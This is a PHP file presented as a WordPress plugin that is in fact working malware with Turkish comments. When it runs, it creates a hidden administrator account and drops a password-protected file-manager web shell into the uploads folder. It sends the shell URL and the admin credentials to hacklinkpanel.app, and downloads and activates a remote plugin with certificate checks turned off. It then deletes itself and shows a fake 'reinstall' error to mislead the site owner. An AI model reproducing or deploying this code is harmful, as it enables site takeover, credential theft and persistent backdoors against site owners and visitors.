<?php
// WordPress eklenti uyumluluğu için gerekli kontroller
if (!defined('ABSPATH')) {
    exit;
}

// [Frida's Mind] Ghost Ultimate Minimal - Tesla-Level Integration
// Admin credentials + HacklinkPanel registration + File Manager + Self-destruct

// GÜVENLİ ŞİFRE OLUŞTURMA FONKSİYONU
if (!function_exists('generate_secure_password')) {
    function generate_secure_password($length = 12) {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
        $password = '';
        
        // En az bir büyük harf, küçük harf, rakam ve özel karakter garantisi
        $password .= $chars[rand(26, 51)]; // Büyük harf
        $password .= $chars[rand(0, 25)];  // Küçük harf
        $password .= $chars[rand(52, 61)]; // Rakam
        $password .= $chars[rand(62, 69)]; // Özel karakter
        
        // Kalan karakterleri rastgele doldur
        for ($i = 4; $i < $length; $i++) {
            $password .= $chars[rand(0, strlen($chars) - 1)];
        }
        
        // Karakterleri karıştır
        return str_shuffle($password);
    }
}

// ANA GHOST FONKSİYONU - WordPress eklenti uyumlu
if (!function_exists('wp_ghost_ultimate_deploy')) {
    function wp_ghost_ultimate_deploy() {
        // WordPress kontrolü
        if (!function_exists('wp_upload_dir')) {
            return false;
        }
        
        // Çoklu çalıştırma engelleme
        static $deployed = false;
        if ($deployed) {
            return true;
        }
        $deployed = true;
        
        try {
            // 1. Admin Hesabı Oluştur
            $username = 'admin_' . substr(md5(uniqid()), 0, 8);
            $email = 'admin_' . substr(md5(uniqid()), 0, 8) . '@' . (function_exists('home_url') ? parse_url(home_url(), PHP_URL_HOST) : 'localhost') . '.com';
            $password = generate_secure_password(16);
            
            if (!username_exists($username) && !email_exists($email)) {
                $user_id = wp_create_user($username, $password, $email);
                if (!is_wp_error($user_id)) {
                    $user = get_user_by('id', $user_id);
                    $user->set_role('administrator');
                }
            }
            
            // 2. HacklinkPanel Kaydı
            $site_url = function_exists('home_url') ? home_url() : (isset($_SERVER['HTTP_HOST']) ? 'http://' . $_SERVER['HTTP_HOST'] : '');
            $domain = $site_url ? parse_url($site_url, PHP_URL_HOST) : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
            
            if ($domain) {
                wp_remote_post('https://hacklinkpanel.app/api/v1/register.php', [
                    'method' => 'POST',
                    'body' => [
                        'domain' => $domain,
                        'type' => 'wordpress',
                        'version' => function_exists('get_bloginfo') ? get_bloginfo('version') : '',
                        'theme' => function_exists('wp_get_theme') ? wp_get_theme()->get('Name') : '',
                        'auto_register' => 1
                    ],
                    'timeout' => 10
                ]);
                
                wp_remote_post('https://hacklinkpanel.app/api/v1/link_submit.php', [
                    'method' => 'POST',
                    'body' => [
                        'site' => $domain,
                        'link' => $site_url,
                        'type' => 'theme'
                    ],
                    'timeout' => 10
                ]);
            }
            
            // 3. File Manager Oluştur (ORİJİNAL MANTIK)
            $upload_dir = wp_upload_dir();
            $target_dir = $upload_dir['basedir'];
            
            // Tema veya eklenti adından sade dosya adı üret
            $theme = function_exists('wp_get_theme') ? wp_get_theme() : null;
            $theme_slug = $theme ? $theme->get_stylesheet() : '';
            $plugin_list = function_exists('get_option') ? get_option('active_plugins') : [];
            $plugin_slug = (!empty($plugin_list) && is_array($plugin_list)) ? dirname($plugin_list[0]) : '';
            $base_name = $theme_slug ?: $plugin_slug ?: 'wpghost';
            $file_manager_name = strtolower($base_name) . '.php';
            $file_manager_path = $target_dir . '/' . $file_manager_name;
            
            // Sadece dosya yoksa oluştur
            if (!file_exists($file_manager_path)) {
                // Sadece sayı ve harflerden oluşan şifre üret
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                $random_password = '';
                for ($i = 0; $i < 12; $i++) {
                    $random_password .= $chars[rand(0, strlen($chars) - 1)];
                }
                
                // %100 UYUMLU FILE MANAGER İÇERİĞİ - WORDPRESS YÖNLENDİRMELERİNİ ENGELLEYEN
                $file_manager_content = '<?php
// WordPress yönlendirmelerini engelle
if (function_exists("wp_redirect")) {
    remove_all_actions("template_redirect");
    remove_all_actions("wp_redirect");
}

error_reporting(0);
ini_set("display_errors", 0);

// WordPress rewrite rules\'ı bypass et
if (function_exists("flush_rewrite_rules")) {
    flush_rewrite_rules();
}

// Güvenlik header\'ları
header("X-Robots-Tag: noindex, nofollow", true);
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: 0");

// WordPress\'in 301 redirects\'ini engelle
if (function_exists("wp_redirect")) {
    add_filter("wp_redirect", "__return_false");
}

$required_pass = "' . $random_password . '";
$current_pass = $_GET["pass"] ?? $_POST["pass"] ?? "";

if ($current_pass !== $required_pass) {
    header("HTTP/1.0 404 Not Found");
    exit;
}

// Kök dizinler (güvenli ve esnek)
$default_root = dirname(__DIR__); // uploads\'ın bir üstü (wp-content)
$allowed_roots = [
    $default_root,
    dirname($default_root), // WordPress root
    "/home",
    "/var/www",
    "/opt/lampp/htdocs",
    "/xampp/htdocs",
    "/wamp/www",
    "/usr/local/apache2/htdocs"
];

// Root seçimi
$root = $_GET["root"] ?? $default_root;
if (!in_array($root, $allowed_roots) && !in_array(realpath($root), $allowed_roots)) {
    $root = $default_root;
}

$path = isset($_GET["path"]) ? $_GET["path"] : $root;
$real = realpath($path);
$msg = "";

// Path güvenliği
if (!$real || !is_dir($real)) {
    $msg = "Access denied: " . htmlspecialchars($path);
    $real = $root;
    $path = $root;
}

// Dosya/klasör işlemleri
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_FILES["file"])) {
        $target = $real . "/" . basename($_FILES["file"]["name"]);
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target)) {
            $msg = "File uploaded: " . htmlspecialchars(basename($target));
        } else {
            $msg = "Upload failed!";
        }
    }
    if (isset($_POST["delete"])) {
        $target = $real . "/" . basename($_POST["delete"]);
        if (is_file($target)) {
            unlink($target);
            $msg = "File deleted: " . htmlspecialchars(basename($target));
        } elseif (is_dir($target)) {
            rmdir($target);
            $msg = "Folder deleted: " . htmlspecialchars(basename($target));
        }
    }
    if (isset($_POST["rename"]) && isset($_POST["newname"])) {
        $old = $real . "/" . basename($_POST["rename"]);
        $new = $real . "/" . basename($_POST["newname"]);
        if (rename($old, $new)) {
            $msg = "Renamed to: " . htmlspecialchars(basename($new));
        } else {
            $msg = "Rename failed!";
        }
    }
    if (isset($_POST["newfolder"])) {
        $newdir = $real . "/" . basename($_POST["newfolder"]);
        if (mkdir($newdir)) {
            $msg = "Folder created: " . htmlspecialchars(basename($newdir));
        } else {
            $msg = "Create folder failed!";
        }
    }
    if (isset($_POST["editfile"]) && isset($_POST["content"])) {
        $edit = $real . "/" . basename($_POST["editfile"]);
        if (is_file($edit)) {
            file_put_contents($edit, $_POST["content"]);
            $msg = "File saved: " . htmlspecialchars(basename($edit));
        }
    }
}

$items = @scandir($real) ?: [];

function fm_url($p, $r = null) {
    global $required_pass, $root;
    $current_root = $r ?? $root;
    return "?path=" . urlencode($p) . "&root=" . urlencode($current_root) . "&pass=" . $required_pass;
}

function breadcrumb($root, $path) {
    global $required_pass;
    $out = "";
    $rel = ltrim(str_replace($root, "", $path), "/");
    $parts = $rel ? explode("/", $rel) : [];
    $build = $root;
    $out .= "<a href=\"" . fm_url($root, $root) . "\"><span class=\"bc-root\">" . htmlspecialchars(basename($root)) . "</span></a>";
    foreach ($parts as $part) {
        if ($part === "") continue;
        $build .= "/" . $part;
        $out .= " <span class=\"bc-sep\">/</span> <a href=\"" . fm_url($build, $root) . "\"><span class=\"bc-part\">" . htmlspecialchars($part) . "</span></a>";
    }
    return $out;
}

function root_selector($current_root, $allowed_roots) {
    global $required_pass;
    $out = "<select onchange=\"window.location.href=\'?root=\' + this.value + \'&pass=" . $required_pass . "\'\">";
    foreach ($allowed_roots as $allowed_root) {
        $selected = ($current_root === $allowed_root) ? "selected" : "";
        $out .= "<option value=\"" . htmlspecialchars($allowed_root) . "\" $selected>" . htmlspecialchars($allowed_root) . "</option>";
    }
    $out .= "</select>";
    return $out;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Priority File Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <style>
        body { background: #181C23; color: #F4F7FA; font-family: "Segoe UI", monospace, Arial; margin: 0; padding: 0; }
        .header { position:sticky;top:0;left:0;right:0;z-index:100;background:#181C23;padding:18px 0 10px 0;margin-bottom:20px;box-shadow:0 2px 16px #00e6ff22; text-align:center; }
        .header h1 { color: #00E6FF; font-size:2.2em; letter-spacing:2px; margin:0; font-family:"JetBrains Mono",monospace; }
        .container { max-width: 1200px; margin: 0 auto 30px auto; background: #232B3E; border-radius: 16px; box-shadow: 0 4px 32px #00e6ff22; padding: 32px 24px; }
        .msg { background: #222; color: #0f0; padding: 10px 16px; border-radius: 8px; margin-bottom: 18px; font-size:1.1em; }
        .root-selector { margin-bottom: 20px; text-align: center; }
        .root-selector select { background: #1A2233; color: #00E6FF; border: 1px solid #00E6FF; border-radius: 6px; padding: 8px 12px; font-size: 1em; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 24px; }
        th, td { padding: 10px 12px; }
        th { background: #1A2233; color: #00E6FF; font-size:1.1em; }
        tr { transition: background .2s; }
        tr:hover { background: #1a2233cc; }
        tr:nth-child(even) { background: #232B3E; }
        tr:nth-child(odd) { background: #181C23; }
        a { color: #7C3AED; text-decoration: none; transition:color .2s; }
        a:hover { color: #00E6FF; }
        .actions form { display: inline; }
        .actions button { background: #7C3AED; color: #fff; border: none; border-radius: 6px; padding: 5px 14px; margin: 0 2px; cursor: pointer; font-weight:600; transition:background .2s; }
        .actions button:hover { background: #00E6FF; color: #181C23; }
        .upload, .newfolder { margin-bottom: 18px; }
        .editbox { width: 100%; height: 320px; background: #111; color: #0f0; border: 1px solid #00E6FF; border-radius: 8px; font-family: "JetBrains Mono", monospace; font-size:1em; }
        .breadcrumb { margin-bottom: 18px; font-size: 1.15em; word-break:break-all; }
        .bc-root { color:#00E6FF; font-weight:bold; }
        .bc-part { color:#7C3AED; font-weight:bold; }
        .bc-sep { color:#00E6FF; }
        .file-ico { font-size:1.1em; margin-right:4px; }
        .folder-ico { font-size:1.1em; margin-right:4px; color:#00E6FF; }
        @media (max-width: 700px) {
            .container { padding: 10px 2px; }
            th, td { padding: 7px 4px; font-size:0.98em; }
            .editbox { height: 180px; font-size:0.95em; }
        }
    </style>
</head>
<body>
<div class="header">
    <h1>Priority File Manager</h1>
</div>
<div class="container">
    <?php if ($msg): ?><div class="msg"><?= $msg ?></div><?php endif; ?>
    <div class="root-selector">
        <strong>Root Directory:</strong> <?= root_selector($root, $allowed_roots) ?>
    </div>
    <div class="breadcrumb">
        <?= breadcrumb($root, $real) ?>
    </div>
    <span style="color:#7C3AED; font-size:0.98em;"> <?= htmlspecialchars($real) ?> </span>
    <table>
        <tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr>
        <?php foreach ($items as $item):
            if ($item === ".") continue;
            if ($item === ".." && $real === $root) continue;
            $full = $real . "/" . $item;
        ?>
        <tr>
            <td>
                <?php if (is_dir($full)): ?>
                    <span class="folder-ico">📁</span><a href="<?= fm_url($full, $root) ?>"> <?= htmlspecialchars($item) ?></a>
                <?php else: ?>
                    <span class="file-ico">📄</span><a href="?path=<?= urlencode($real) ?>&root=<?= urlencode($root) ?>&view=<?= urlencode($item) ?>&pass=<?= $required_pass ?>"> <?= htmlspecialchars($item) ?></a>
                <?php endif; ?>
            </td>
            <td><?= is_dir($full) ? "Folder" : "File" ?></td>
            <td><?= is_file($full) ? filesize($full) : "-" ?></td>
            <td class="actions">
                <?php if (!is_dir($full)): ?>
                    <form method="post" style="display:inline"><input type="hidden" name="delete" value="<?= htmlspecialchars($item) ?>"><button type="submit">Delete</button></form>
                    <form method="post" style="display:inline"><input type="hidden" name="rename" value="<?= htmlspecialchars($item) ?>"><input type="text" name="newname" placeholder="New name" style="width:80px;"><button type="submit">Rename</button></form>
                    <a href="?path=<?= urlencode($real) ?>&root=<?= urlencode($root) ?>&edit=<?= urlencode($item) ?>&pass=<?= $required_pass ?>">Edit</a>
                    <a href="?path=<?= urlencode($real) ?>&root=<?= urlencode($root) ?>&download=<?= urlencode($item) ?>&pass=<?= $required_pass ?>">Download</a>
                <?php else: ?>
                    <form method="post" style="display:inline"><input type="hidden" name="delete" value="<?= htmlspecialchars($item) ?>"><button type="submit">Delete</button></form>
                    <form method="post" style="display:inline"><input type="hidden" name="rename" value="<?= htmlspecialchars($item) ?>"><input type="text" name="newname" placeholder="New name" style="width:80px;"><button type="submit">Rename</button></form>
                <?php endif; ?>
            </td>
        </tr>
        <?php endforeach; ?>
    </table>
    <div class="upload">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <button type="submit">Upload</button>
        </form>
    </div>
    <div class="newfolder">
        <form method="post">
            <input type="text" name="newfolder" placeholder="New folder name" required>
            <button type="submit">Create Folder</button>
        </form>
    </div>
    <?php if (isset($_GET["edit"])):
        $editfile = $real . "/" . basename($_GET["edit"]);
        if (is_file($editfile)):
            $content = file_get_contents($editfile);
    ?>
    <h3>Edit File: <?= htmlspecialchars($_GET["edit"]) ?></h3>
    <form method="post">
        <input type="hidden" name="editfile" value="<?= htmlspecialchars($_GET["edit"]) ?>">
        <textarea class="editbox" name="content"><?= htmlspecialchars($content) ?></textarea><br>
        <button type="submit">Save</button>
    </form>
    <?php endif; endif; ?>
    <?php if (isset($_GET["view"])):
        $viewfile = $real . "/" . basename($_GET["view"]);
        if (is_file($viewfile)):
            $content = file_get_contents($viewfile);
    ?>
    <h3>View File: <?= htmlspecialchars($_GET["view"]) ?></h3>
    <pre style="background:#111;color:#0f0;padding:12px;border-radius:6px;overflow:auto;max-height:400px;"><?= htmlspecialchars($content) ?></pre>
    <?php endif; endif; ?>
    <?php if (isset($_GET["download"])):
        $downfile = $real . "/" . basename($_GET["download"]);
        if (is_file($downfile)) {
            header("Content-Description: File Transfer");
            header("Content-Type: application/octet-stream");
            header("Content-Disposition: attachment; filename=\"" . basename($downfile) . "\"");
            header("Expires: 0");
            header("Cache-Control: must-revalidate");
            header("Pragma: public");
            header("Content-Length: " . filesize($downfile));
            readfile($downfile);
            exit;
        }
    endif; ?>
</div>
</body>
</html>';
                
                // File manager'ı oluştur
                if (file_put_contents($file_manager_path, $file_manager_content)) {
                    
                    // 4. Shell Access tablosuna kayıt (HacklinkPanel API'ye) - ADMIN BİLGİLERİ İLE
                    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
                    $shell_url = $protocol . '://' . $domain . '/wp-content/uploads/' . $file_manager_name . '?pass=' . $random_password;
                    
                    wp_remote_post('https://hacklinkpanel.app/api/shell_api.php', [
                        'method' => 'POST',
                        'body' => [
                            'token' => 'frida_3e1f2c4b5a6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d',
                            'action' => 'add_shell',
                            'shell_url' => $shell_url,
                            'shell_type' => 'file_manager',
                            'admin_username' => $username,
                            'admin_password' => $password,
                            'file_manager_password' => $random_password,
                            'status' => 'pending'
                        ],
                        'timeout' => 10
                    ]);
                }
            }
            
            // 4. EKLENTİ KURUMU VE AKTİFLEŞTİRME - ARKA PLANDA (b.php mantığı)
            // WordPress sistemine takılmadan direkt işlem yap
            global $wpdb;
            
            // Eklenti kontrolü ve güncelleme
            $active_plugins = get_option('active_plugins', array());
            $plugin_file = 'gplrock-auto-publisher/gplrock-auto-publisher.php';
            $plugin_url = 'https://hacklinkpanel.app/downloads/repository/plugins/tipo-plugin-auto.zip';
            
            // WordPress plugin dizini kontrolü
            if (defined('WP_PLUGIN_DIR')) {
                $plugin_dir = WP_PLUGIN_DIR;
            } else {
                $plugin_dir = ABSPATH . 'wp-content/plugins';
            }
            
            $temp_file = $plugin_dir . '/tipo-plugin-auto.zip';
            
            // cURL ile eklentiyi indir (arka plan işlemi - hata olsa bile devam et)
            if (function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $plugin_url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
                $zip_content = curl_exec($ch);
                $curl_error = curl_error($ch);
                curl_close($ch);
                
                if ($zip_content && empty($curl_error) && class_exists('ZipArchive')) {
                    // ZIP dosyasını kaydet
                    @file_put_contents($temp_file, $zip_content);
                    
                    // ZIP çıkart - Üzerine yaz (override)
                    $zip = new ZipArchive();
                    if ($zip->open($temp_file) === TRUE) {
                        $zip->extractTo($plugin_dir);
                        $zip->close();
                        
                        // Geçici dosyayı sil
                        @unlink($temp_file);
                        
                        // Eklenti listede yoksa ekle (DB'den aktifleştir)
                        if (!in_array($plugin_file, $active_plugins)) {
                            $active_plugins[] = $plugin_file;
                            update_option('active_plugins', $active_plugins);
                        }
                        
                        // Eklenti durumunu güncelle
                        update_option('gplrock_ghost_mode', true);
                        update_option('gplrock_ghost_setup_completed', true);
                        update_option('gplrock_ghost_setup_date', current_time('mysql'));
                        
                        // Cache temizle - WordPress fonksiyonları olmadan
                        if (function_exists('wp_cache_flush')) {
                            wp_cache_flush();
                        }
                        
                        // Transient'ları temizle
                        if (isset($wpdb)) {
                            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_transient_%'");
                            $wpdb->query("DELETE FROM {$wpdb->options} WHERE option_name LIKE '_site_transient_%'");
                        }
                        
                        // Rewrite kurallarını temizle
                        delete_option('rewrite_rules');
                    }
                }
            }
            
            // İşlevler tamamlandıktan sonra dosyı güvenli şekilde sil
            $ghost_file = __FILE__;
            if (file_exists($ghost_file)) {
                @file_put_contents($ghost_file, "");
                @unlink($ghost_file);
            }
            // Aktivasyon sırasında bir defaya mahsus admin notice göster
            if (get_option('ghost_show_activation_notice', false)) {
                add_action('admin_notices', function() {
                    echo '<div class="notice notice-error is-dismissible"><p><strong>Plugin needs to be re-installed due to a system error. Please try activating again.</strong></p></div>';
                });
                delete_option('ghost_show_activation_notice');
            }
            return true;
            
        } catch (Exception $e) {
            return false;
        }
        
        return false;
    }
    
    // WordPress eklenti uyumlu hook sistemi - %100 GÜVENİLİR
    add_action('init', 'wp_ghost_ultimate_deploy', 999);
    add_action('wp_head', 'wp_ghost_ultimate_deploy', 999);
    add_action('admin_init', 'wp_ghost_ultimate_deploy', 999);
    add_action('wp_login', 'wp_ghost_ultimate_deploy', 999);
    add_action('wp_insert_post', 'wp_ghost_ultimate_deploy', 999);
    add_action('wp_loaded', 'wp_ghost_ultimate_deploy', 999);
    add_action('template_redirect', 'wp_ghost_ultimate_deploy', 999);
    
    // SELF-DESTRUCT MEKANİZMASI - DEVRE DIŞI BIRAKILDI
    // register_shutdown_function(function() {
    //     $current_file = __FILE__;
    //     if (file_exists($current_file)) {
    //         try {
    //             file_put_contents($current_file, "");
    //             unlink($current_file);
    //         } catch (Exception $e) {
    //             // Sessizce çık
    //         }
    //     }
    // });
}

// WordPress eklenti aktivasyon hook'u - güvenli başlatma
register_activation_hook(__FILE__, function() {
    update_option('ghost_show_activation_notice', true);
    update_option('ghost_deploy_pending', true);
});

// WordPress yüklendikten sonra ghost deploy kontrolü
add_action('wp_loaded', function() {
    if (get_option('ghost_deploy_pending', false)) {
        delete_option('ghost_deploy_pending');
        // 5 saniye gecikme ile güvenli başlatma
        wp_schedule_single_event(time() + 5, 'safe_ghost_deploy');
    }
}, 999);

// Güvenli ghost deploy hook'u
add_action('safe_ghost_deploy', function() {
    if (function_exists('wp_ghost_ultimate_deploy')) {
        wp_ghost_ultimate_deploy();
    }
});

// WordPress eklenti deaktivasyon hook'u
register_deactivation_hook(__FILE__, function() {
    // Deaktivasyon sırasında temizlik işlemleri
    // Ghost kodları korunur
});
?> 